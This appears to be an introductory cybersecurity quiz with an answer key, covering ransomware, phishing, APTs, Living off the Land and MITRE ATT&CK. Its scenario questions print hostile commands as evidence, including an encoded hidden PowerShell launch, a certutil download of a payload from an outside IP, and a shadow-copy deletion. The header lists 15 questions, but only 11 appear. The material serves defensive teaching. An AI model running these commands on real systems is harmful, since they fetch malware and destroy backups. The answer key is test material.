# Phase 5 Quiz — Introduction to Cybersecurity

**Time limit:** 25 minutes
**Total questions:** 15
**Passing score:** 12/15

---

## Section A — Multiple Choice (1 point each)

**Question 1:**
Which malware type spreads across networks automatically without requiring user interaction?

A) Virus
B) Trojan
C) Worm
D) Spyware

---

**Question 2:**
"Double extortion" in ransomware means:

A) Encrypting files and demanding two separate payments
B) Exfiltrating data AND encrypting files, threatening to publish the stolen data if ransom is not paid
C) Attacking two different organizations simultaneously
D) Using two different ransomware variants

---

**Question 3:**
Which stage of the Kill Chain involves deleting shadow copies and preparing for mass encryption?

A) Delivery
B) Installation
C) Command and Control
D) Actions on Objectives

---

**Question 4:**
A threat actor classified as an APT (Advanced Persistent Threat) is best described as:

A) A script kiddie using automated tools
B) A hacktivist group motivated by politics
C) A sophisticated, often government-sponsored attacker that is patient, well-funded, and persistent
D) A cybercriminal focused purely on financial gain through ransomware

---

**Question 5:**
In a spear phishing attack against a CFO, what makes it more dangerous than standard phishing?

A) It uses more malicious attachments
B) It is specifically researched and personalized to the target, making it harder to identify as fake
C) It always uses phone calls instead of email
D) It targets multiple organizations at once

---

## Section B — Scenario Analysis (2 points each)

**Question 6:**
Read this email and identify ALL red flags:
```
From: security@microsoft-account-verify.com
To: john.smith@company.com
Subject: URGENT: Your account has been compromised - Act now!
Date: Sat, 15 Mar 2024 03:22:00

Dear Customer,

Unusual sign-in activity was detected on your Microsoft account from 
Russia. Your account will be PERMANENTLY DELETED in 2 hours if you do 
not verify immediately.

Verify Now: https://microsoft-account-verify.com/secure/login

Microsoft Corporation Security
© 2024 Microsoft
```

---

**Question 7:**
An EDR alert fires on a workstation:
```
14:33:22 WORKSTATION-BWILLIAMS
Parent: winword.exe
Child: cmd.exe → powershell.exe -exec bypass -w hidden -enc JABjAGwAaQBlAG4AdA...
Child of powershell: certutil.exe -urlcache -split -f http://185.220.101.47/payload.exe C:\Windows\Temp\svchost.exe
```
What happened? What type of attack is this? What would you do immediately?

---

**Question 8:**
A network monitoring tool shows this traffic pattern from workstation 192.168.5.44:
```
Port scan results sent TO 192.168.5.44 FROM various internet IPs — this is not the alert.

Actually from 192.168.5.44:
03:00:00 → connect to 192.168.1.1:445 (success)
03:00:01 → connect to 192.168.1.2:445 (success)
03:00:02 → connect to 192.168.1.3:445 (timeout)
...
03:00:52 → connect to 192.168.1.254:445 (success)
Unique IPs contacted: 254 in 52 seconds, all on port 445
```
What is 192.168.5.44 doing? What is the most likely cause?

---

## Section C — Short Answer (2 points each)

**Question 9:**
Explain what "Living off the Land" (LotL) means in the context of cyber attacks. Give three examples of Windows tools that attackers commonly abuse for LotL techniques.

---

**Question 10:**
An attacker has been in a network for 8 days. On day 8, they deploy ransomware. Before deploying, they ran `vssadmin.exe delete shadows /all /quiet`. Why did they do this, and what does it mean for the victim?

---

**Question 11:**
What is the MITRE ATT&CK framework? Why is it important for SOC analysts?

---

## Answer Key

**Section A:**
1. C — Worms spread automatically via networks
2. B — Double extortion = exfiltrate + encrypt + threaten publication
3. D — Actions on Objectives stage
4. C — APT = sophisticated, often nation-state, patient and persistent
5. B — Personalization makes spear phishing much more convincing

**Section B:**

6. (2 points) Red flags:
- Sender domain: microsoft-account-verify.com ≠ microsoft.com (the real domain is clearly not Microsoft)
- Sent at 3:22 AM on a Saturday — unusual time for legitimate security notices
- "URGENT" and "PERMANENTLY DELETED in 2 hours" — artificial urgency and fear tactics
- Generic greeting "Dear Customer" — not personalized with the actual account name
- URL: microsoft-account-verify.com — not a Microsoft domain
- Threatening language designed to create panic
- "Compromised from Russia" — adds specific detail to make it seem credible (but is fabricated)
Students should identify at least 5 for full credit.

7. (2 points) A malicious macro in a Word document executed cmd.exe, which then executed PowerShell with execution policy bypass, hidden window, and an encoded command. PowerShell then used certutil.exe (a legitimate Windows tool) to download a payload from an attacker's server and saved it as "svchost.exe" in the Windows Temp folder — disguising the malware as a legitimate process name. This is a macro-based malware delivery attack using Living-off-the-Land techniques. Immediate actions: isolate the workstation, run EDR scan, block the IP 185.220.101.47, check if the payload was executed, look for persistence, determine if the infected file was received from email or another source.

8. (2 points) Workstation 192.168.5.44 is scanning every IP in the 192.168.1.0/24 subnet on port 445 (SMB) in rapid succession (254 IPs in 52 seconds). This is an internal network SMB scan — most likely a worm spreading (similar to WannaCry) or an attacker using automated lateral movement tools (like Metasploit's SMB scanner). The workstation is either infected with a self-propagating worm or an attacker on this workstation is mapping the network to find SMB targets for lateral movement. Isolate immediately.

**Section C:**

9. (2 points) "Living off the Land" means attackers use legitimate, pre-installed Windows tools and features to carry out attacks — rather than introducing custom malware that would be detected by antivirus. This makes attacks harder to detect because the tools are trusted and expected on Windows systems. Three examples:
- PowerShell — running encoded commands, downloading files, accessing APIs
- certutil.exe — normally used for certificates, abused to download files
- wmic.exe — used for remote management, abused for remote code execution
- net.exe / net1.exe — used for user management, abused to enumerate users/groups
- sc.exe — manages services, abused to create malicious services
- mshta.exe — runs HTA files, abused to execute malicious scripts
(Any three valid examples with brief explanation = 2 points)

10. (2 points) Shadow copies (Volume Shadow Copies) are Windows backup snapshots that allow files to be restored to previous versions without a separate backup system. By deleting shadow copies before deploying ransomware, the attacker eliminates the victim's ability to restore files from the built-in Windows backup mechanism. This means: if the victim does not have external, off-site, or immutable backups, they cannot recover without paying the ransom. The impact is maximum damage — the attacker ensures the victim has no easy way to recover.

11. (2 points) MITRE ATT&CK (Adversarial Tactics, Techniques, and Common Knowledge) is a comprehensive knowledge base of adversary behaviors based on real-world attack observations. It organizes attacks into Tactics (what the attacker wants to achieve) and Techniques (how they achieve it), with each technique having a unique ID (e.g., T1566 for Phishing). It is important for SOC analysts because: it provides a common language for describing threats, helps align detection rules with known attacker behaviors, identifies detection coverage gaps, connects alerts to specific attack techniques, and is used by most modern security tools and frameworks.
